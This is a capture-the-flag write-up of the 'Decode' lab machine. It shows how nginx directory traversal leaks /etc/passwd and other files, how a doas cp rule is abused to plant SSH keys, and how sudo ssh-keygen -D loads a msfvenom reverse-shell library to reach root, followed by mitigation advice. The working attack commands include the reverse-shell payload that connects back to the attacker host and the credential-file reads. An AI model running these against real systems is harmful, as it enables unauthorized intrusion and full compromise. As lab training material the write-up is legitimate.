---
title: Decode
layout: default
---


## Executive Summary

This write-up details the exploitation of the **Decode** machine, where several vulnerabilities were identified that allowed privilege escalation to gain root access. Key steps included:

1. **Reconnaissance**: Identification of open ports and directory enumeration.
2. **Exploitation**: Use of `doas` to escalate from `steve` to `ajneya`.
3. **Privilege escalation**: Creation of a malicious library and use of `ssh-keygen` to obtain a shell as root.

The main vulnerabilities exploited were:
- Misconfigured `doas` permissions.
- Use of `ssh-keygen` with root permissions on files inside `/opt/`.

It is recommended to review `doas` and `sudo` permissions to avoid unauthorized privilege escalations.

----

## 1. Reconnaissance

### 1.1. Enumerate of the network

```bash
ifconfig
```

**OUTPUT**

```bash
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.105  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::f84f:aaf4:a787:c420  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:0f:50:93  txqueuelen 1060  (Ethernet)
```

**Key points:** 
- Networok Interface: `ens160`

```bash
arp-scan -I ens160 -lg
```

**OUTPUT**

```bash
192.168.0.106	08:00:27:e7:d7:62	PCS Systemtechnik GmbH
```

**Key points:** 
- IP Machine: `192.168.0.106`

### 1.2. Scanning of Ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.106
```

**OUTPUT**

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

**Key points:** 
- `22/tcp open ssh`: This indicates that the SSH (Secure Shell) service is running on port 22.
- `80/tcp open http`: This indicates that the HTTP (Hypertext Transfer Protocol) service is running on port 80.
- `ttl 64`: Linux Machine

Go to `192.168.0.106` by browser:

![](/assets/images/Decode.png)
## 2. Enumerate Directories and Files

```bash
dirb http://192.168.0.106
```

**OUTPUT**

```bash
http://192.168.0.106/robots.txt (CODE:200|SIZE:240)
```

Among so many directories, robots.txt caught my attention.

```bash
❯ curl http://192.168.0.106/robots.txt
User-agent: decode
Disallow: /encode/

User-agent: *
Allow: /
Allow: /decode
Allow: ../
Allow: /index
Allow: .shtml
Allow: /lfi../
Allow: /etc/
Allow: passwd
Allow: /usr/
Allow: share
Allow: /var/www/html/
Allow: /cgi-bin/
Allow: decode.sh
```

```bash
❯ curl -s http://192.168.0.106/robots.txt > robots_paths

❯ cat robots_paths
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: robots_paths
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ User-agent: decode
   2   │ Disallow: /encode/
   3   │ 
   4   │ User-agent: *
   5   │ Allow: /
   6   │ Allow: /decode
   7   │ Allow: ../
   8   │ Allow: /index
   9   │ Allow: .shtml
  10   │ Allow: /lfi../
  11   │ Allow: /etc/
  12   │ Allow: passwd
  13   │ Allow: /usr/
  14   │ Allow: share
  15   │ Allow: /var/www/html/
  16   │ Allow: /cgi-bin/
  17   │ Allow: decode.sh
```

```bash
❯ cat robots_paths | sed -n 's/^Allow: //p' | sponge robots_paths

❯ cat robots_paths
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: robots_paths
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ /
   2   │ /decode
   3   │ ../
   4   │ /index
   5   │ .shtml
   6   │ /lfi../
   7   │ /etc/
   8   │ passwd
   9   │ /usr/
  10   │ share
  11   │ /var/www/html/
  12   │ /cgi-bin/
  13   │ decode.sh
```

**Key points:**
- `/var/www/html/`: The default document root for web servers like Apache and Nginx.
- `/cgi-bin/`: A directory for **Common Gateway Interface (CGI)** scripts, which may contain executable scripts (potential RCE target).

### 2.1. Testing Directory Traversal

```bash
❯ curl -I http://192.168.0.106/decode
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Mon, 24 Feb 2025 19:18:00 GMT
Content-Type: text/html
Location: http://192.168.0.106/decode/
Connection: keep-alive

❯ curl -I http://192.168.0.106/decode/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 24 Feb 2025 19:18:19 GMT
Content-Type: text/html
Connection: keep-alive
```

```bash
❯ curl -I http://192.168.0.106/decode..
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Mon, 24 Feb 2025 19:20:45 GMT
Content-Type: text/html
Location: http://192.168.0.106/decode../
Connection: keep-alive

❯ curl -I http://192.168.0.106/decode../
HTTP/1.1 403 Forbidden
Server: nginx/1.18.0
Date: Mon, 24 Feb 2025 19:22:55 GMT
Content-Type: text/html
Connection: keep-alive
```

The server responded with a *403 Forbidden code*, indicating that the path exists but does not allow access. However, this does not completely rule out the possibility of **directory traversal**, as the server could be blocking only certain paths.

### 2.2. Fuzzing to `decode/` and `decode../`

```bash
gobuster dir -u http://192.168.0.106/decode/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**OUTPUT**

```bash
===============================================================
/crontab              (Status: 200) [Size: 1042]
/default              (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/default/]
/environment          (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/fonts/]
/group                (Status: 200) [Size: 758]
/hosts                (Status: 200) [Size: 186]
/issue                (Status: 200) [Size: 27]
/kernel               (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/kernel/]
/ldap                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/ldap/]
/magic                (Status: 200) [Size: 111]
/modules              (Status: 200) [Size: 195]
/motd                 (Status: 200) [Size: 286]
/network              (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/network/]
/opt                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/opt/]
/passwd               (Status: 200) [Size: 1638]
/perl                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/perl/]
/php                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/php/]
/profile              (Status: 200) [Size: 769]
/rpc                  (Status: 200) [Size: 887]
/security             (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/security/]
/services             (Status: 200) [Size: 12813]
/shadow               (Status: 403) [Size: 153]
/skel                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/skel/]
/ssh                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/ssh/]
/ssl                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/ssl/]
/sv                   (Status: 301) [Size: 169] [--> http://192.168.0.106/decode/sv/]
```

```bash
gobuster dir -u http://192.168.0.106/decode../ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**OUTPUT**

```bash
/bin                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../bin/]
/boot                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../boot/]
/dev                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../dev/]
/etc                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../etc/]
/home                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../home/]
/lib                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../lib/]
/lost+found           (Status: 403) [Size: 153]
/media                (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../media/]
/opt                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../opt/]
/proc                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../proc/]
/root                 (Status: 403) [Size: 153]
/run                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../run/]
/sbin                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../sbin/]
/srv                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../srv/]
/sys                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../sys/]
/tmp                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../tmp/]
/usr                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/]
/var                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../var/]
```

The fact that the server responded with a 200 OK or 301 Moved Permanently code for paths such as `/usr` and `/etc` confirms that **the server is vulnerable to directory traversal**.

In `decode/` curl to `passwd`:

```bash
❯ curl -i http://192.168.0.106/decode/passwd
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 24 Feb 2025 18:57:45 GMT
Content-Type: application/octet-stream
Transfer-Encoding: chunked
Connection: keep-alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
steve:$y$j9T$gbohHcbFkUEmW0d3ZeUx40$Xa/DJJdFujIezo5lg9PDmswZH32cG6kAWP.crcqrqo/:1001:1001::/usr/share:/bin/bash
decoder:x:1002:1002::/home/decoder:/usr/sbin/nologin
ajneya:x:1003:1003::/home/ajneya:/bin/bash
```

**Key points:** 
- We have tree users:
	- steve → /usr/share
	- decoder → /home/decoder
	- ajneya → /home/ajneya

I focus in `steve`:

>[!Note]
>- Remember that `/usr/share` is contemplated in `robots.txt`
>- From `decode/` i cannot access to `/usr/share` or `/home` according fuzzing.

## 3. Vulnerability Exploitation

#### 3.1. Fuzzing to Steve's Directory

```bash
❯ gobuster dir -qu http://192.168.0.106/decode../usr/share/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
/.bashrc              (Status: 200) [Size: 3526]
/.bash_history        (Status: 200) [Size: 38]
/applications         (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/applications/]
/bug                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/bug/]
/doc                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/doc/]
/file                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/file/]
/fonts                (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/fonts/]
/icons                (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/icons/]
/info                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/info/]
/java                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/java/]
/locale               (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/locale/]
/man                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/man/]
/menu                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/menu/]
/misc                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/misc/]
/pam                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/pam/]
/perl5                (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/perl5/]
/perl                 (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/perl/]
/php                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/php/]
/tools                (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/tools/]
/xml                  (Status: 301) [Size: 169] [--> http://192.168.0.106/decode../usr/share/xml/]
```

#### 3.1.1. Key File Analysis

Curl to `.bash_history`:

```bash
❯ curl http://192.168.0.106/decode../usr/share/.bash_history
rm -rf /usr/share/ssl-cert/decode.csr
```

**Key points:** 
- `decode.csr` could be related to an SSL certificate or some configuration file on the server.

Let´s read to `decode.csr`

```bash
❯ curl http://192.168.0.106/decode../usr/share/ssl-cert/decode.csr
-----BEGIN CERTIFICATE REQUEST-----
MIIDAzCCAesCAQAwSDERMA8GA1UEAwwISGFja015Vk0xDzANBgNVBAgMBmRlY29k
ZTEPMA0GA1UEBwwGZGVjb2RlMREwDwYDVQQKDAhIYWNrTXlWTTCCASIwDQYJKoZI
hvcNAQEBBQADggEPADCCAQoCggEBANnSG9vEEGPRgDA/cT6NT3sMKsi6dLhKwRgy
PcRpRt1TO63kpY2PxNSgOPpydjUm34nwghy5lPL4+GBXoNOHMhQI1hUVqZXmuFB8
+DCETqXNfV5JnTRMG5tr2m4vV1HNTH+/GUueBm5R/ERu69n2xMADs4nEL3iRjOO/
19sYZIj+ZDaN3MouyqrprWy9PBwKf2VTy4prJh6nTEVSV8oRRtd+nOxfEG6890+P
lF6s0XDpv8V001aiJWSceYPIikvKXaVy45h3JoYzWsQzt3b1R22DuPjAOQ3AvZbp
V68lkF+S1rIa7gsb8oeZI16yPz+GEPVvXGzLyIYhDixdxOCFZaECAwEAAaB2MBkG
CSqGSIb3DQEJBzEMDAppNG1EM2MwZDNyMFkGCSqGSIb3DQEJDjFMMEowDgYDVR0P
AQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAWBgNV
HREEDzANggtoYWNrbXl2bS5ldTANBgkqhkiG9w0BAQsFAAOCAQEAO73W3pTMqSm2
A37vepuR4F3ycnFKdFyRhk1rtO1LE9OWOI3bQ7kW0wIFuRaqFONsG/mvGFgEfRR8
xpgSYmnzWJQ0nTOtGi6d7F0dFFmYIXe75+6QYM2ZwAYf3lW+HRKLXhh5FMeoXJHo
eU64o9tFdhWxcB1OLAGEG9MI6AhN62ZTrKwMq13/PIteoPAEnlVgBidxQxUVHQfO
EwMP38jzm+HESbZsNVjX4RQjtvBUAKQUTBRYuS02QqqC5ajHz0RWaGgrGIyKrip5
yRjgsjxtmadaetxSasIg5tsjSFGyyVVPsdY4umAUUm+dSobruxcyXuxXIgn27Z7M
h97It2ELpw==
-----END CERTIFICATE REQUEST-----
```

I wilh decode thi SSL:

```bash
curl http://192.168.0.106/decode../usr/share/ssl-cert/decode.csr -s > decode.csr
openssl req -in decode.csr -noout -text
```

![](/assets/images/Decode-1.png)

### 3.2. Access as `steve`

I will access as `steve`:

```bash
❯ ssh steve@192.168.0.106
steve@192.168.0.106's password: 

steve@decode:~$ 
```

```bash
steve@decode:/$ cd /home/ajneya/
steve@decode:/home/ajneya$ ls -l
total 4
-r-------- 1 ajneya ajneya 33 Apr 14  2022 user.txt
```

`steve` does not permission for read it.

I will list the permission steve has:

```bash
steve@decode:~$ sudo -l
Matching Defaults entries for steve on decode:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steve may run the following commands on decode:
    (decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee
```

But, these permissions are not useful.

So i will list the SUID permissions:

```bash
steve@decode:~$ find / -perm -u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/doas
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**Key points:** 
- `doas` binary allows a user to execute commands as another user, typically root, based on rules defined in the `/etc/doas.conf` configuration file.

```bash
steve@decode:~$ cat /etc/doas.conf
permit nopass steve as ajneya cmd cp
```

**Key points:** 
- steve can use `cp` as ajneya.

The plan is to access `ajneya` by copying my public `id_rsa` key into `/home/steve/.ssh`, then transferring it to `ajneya`'s `.ssh` directory to gain access to their account. Since `ajneya` does not have an existing `.ssh` directory,

```bash
steve@decode:/home/ajneya$ ls -al
total 24
drwxr-xr-x 2 ajneya ajneya 4096 Apr 14  2022 .
drwxr-xr-x 4 root   root   4096 Apr 14  2022 ..
lrwxrwxrwx 1 root   root      9 Apr 14  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ajneya ajneya  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 ajneya ajneya 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 ajneya ajneya  807 Aug  4  2021 .profile
-r-------- 1 ajneya ajneya   33 Apr 14  2022 user.txt
```

I will first copy Steve's `.ssh` directory, along with my public `id_rsa` key, into `/home/ajneya/`.

Hands on...

### 3.3. Escalation to `ajneya`

```bash
steve@decode:/home/steve/.ssh$ ls
authorized_keys

steve@decode:/home/steve$ doas -u ajneya cp -r .ssh/ /home/ajneya/
steve@decode:/home/steve$ cd /home/ajneya/.ssh/
steve@decode:/home/ajneya/.ssh$ ls
authorized_keys
```


```bash
❯ ssh ajneya@192.168.0.106

ajneya@decode:~$ 
```

**FLAG 1**

```bash
ajneya@decode:~$ ls
user.txt
```

## 4. Privilege Escalation

List of permission has `ajneya`:

```bash
ajneya@decode:~$ ls  sudo -l
Matching Defaults entries for ajneya on decode:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ajneya may run the following commands on decode:
    (root) NOPASSWD: /usr/bin/ssh-keygen * /opt/*
```

**Key points:** 
- `ajneya` has permissions to run ssh-keygen as root on any file inside /opt/, no password required.

This means `ajneya` can execute `ssh-keygen` on any file within `/opt/` as root, which provides a potential way to execute arbitrary code.

For which i will take adventage of this to execute a malicious shared library with root privileges.

### 4.1. Creating a Malicious Shared Library for a Reverse Shell

On my attacking machine, I will generate a malicious `.so` file using `msfvenom`. This file contains a reverse shell payload, which will connect back to my machine when executed:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.105 LPORT=1234 -o lib.so -f elf-so
```

**Key points:** 
- `-p linux/x64/shell_reverse_tcp`: Generates a reverse shell payload for Linux (64-bit)
- `LHOST=192.168.0.105`: The IP of my attacking machine
- `LPORT=1234`: The port where I will listen for the connection
- `-o lib.so`: Saves the payload as `lib.so`
- `-f elf-so`: Formats it as a shared library (`.so` file)

### 4.2. Transferring the Malicious File to the Target Machine

I will transfer `lib.so` to the target system using `scp`:

```bash
scp lib.so ajneya@192.168.0.106:/tmp
```

### 4.3. Moving lib.so to /opt/decode/ Using steve's Permissions

Although `ajneya` does not have write access to `/opt/`, the user `steve` has sudo privileges to write in `/opt/decode/`.

Remembering `steve`'s sudo privileges:

```bash
User steve may run the following commands on decode:
    (decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee
```

This means `steve` can execute `tee` as `decoder`. If `decoder` has write permissions on `/opt/decode/`, then `steve` can write files there using `sudo -u decoder tee`.

Now, I will use `tee` to place the malicious file in `/opt/decode/`:

```bash
cat /tmp/lib.so | sudo -u decoder tee /opt/decode/lib.so
```

Since `tee` is running as `decoder`, the file is successfully written to `/opt/decode/`.

### 4.4. Setting Up a Netcat Listener on my Attacker's Machine

I will start a Netcat listener on my machine to catch the incoming shell connection:

```bash
nc -nlvp 1234
```

### 4.5. Executing the Exploit to Trigger the Reverse Shell

I will execute `ssh-keygen -D` on the target system:

```bash
sudo ssh-keygen -D /opt/decode/lib.so
```

**Key points:** 
- `ssh-keygen -D` loads and executes the malicious shared library (`lib.so`).
- The payload inside `lib.so` is triggered, establishing a reverse shell to my attacker machine.

#### 4.5.1. Receiving the Root Shell

Since my Netcat listener is active, I receive an incoming connection:

```bash
❯ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.0.105] from (UNKNOWN) [192.168.0.106] 47266
whoami
root
ls
user.txt
pwd
/home/ajneya
cd ..
pwd
/home
ls
ajneya
steve
cd ..
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd /root
ls
root.txt
cat root.txt 
```

**SECOND FLAG**

----

## Summary

### Vulnerabilities Exploited

| <center>Vulnerabilities Exploited                  | <center>Summary                                                                                                                                                                                                |
| -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Sensitive Information Exposure via `robots.txt`    | The `robots.txt` file contained sensitive paths such as `/etc/`, `/usr/share/`, and `/var/www/html/`, which allowed the enumeration of critical directories and files.                                         |
| Unauthorized Access to System Files                | Through directory traversal testing, access to files like `.bash_history` and `decode.csr` was achieved, revealing sensitive system information.                                                               |
| Insecure Configuration of `doas`                   | The user `steve` had permissions to execute `doas` as `ajneya` without a password, enabling privilege escalation by copying critical files such as SSH keys.                                                   |
| Insecure Use of `ssh-keygen` with Root Permissions | The user `ajneya` had permissions to execute `ssh-keygen` as root on any file within `/opt/`, allowing the loading of a malicious library (`lib.so`) and the execution of arbitrary code with root privileges. |

### Recommendations for Mitigation

| <center>Recommendation                              | <center>Action                                                                                                                                                                                                    | <center>Benefit                                                                             |
| --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| Restrict Access to `robots.txt` and Sensitive Files | Limit the information exposed in `robots.txt`. Avoid including sensitive paths like `/etc/`, `/usr/share/`, or `/var/www/html/`.                                                                                  | Reduces the attack surface and makes it harder to enumerate critical directories and files. |
| Protect Against Directory Traversal                 | Configure the web server (in this case, Nginx) to block requests containing `..` or special characters that allow traversal.                                                                                      | Prevents unauthorized access to files outside the web server's root directory.              |
| Review and Restrict `doas` and `sudo` Permissions   | Review and adjust `doas` and `sudo` rules to prevent low-privileged users from executing critical commands without authentication. Example: Remove or restrict `NOPASSWD` for commands like `cp` or `ssh-keygen`. | Reduces the risk of unauthorized privilege escalation.                                      |
| Limit Execution Permissions in `/opt/`              | Restrict execution permissions in the `/opt/` directory to prevent non-privileged users from loading and executing malicious files. Example: Ensure only authorized users can write or execute files in `/opt/`.  | Prevents the execution of malicious code with elevated privileges.                          |
| Harden SSH Configuration                            | Disable SSH access for users who do not need it and ensure SSH keys are protected with strong passwords. Example: Disable SSH access for `steve` and `ajneya` if not necessary.                                   | Reduces the risk of unauthorized access via SSH.                                            |
| Update and Patch the System                         | Ensure the operating system and services (such as Nginx and OpenSSL) are updated with the latest security patches.                                                                                                | Fixes known vulnerabilities and reduces the risk of exploitation.                           |
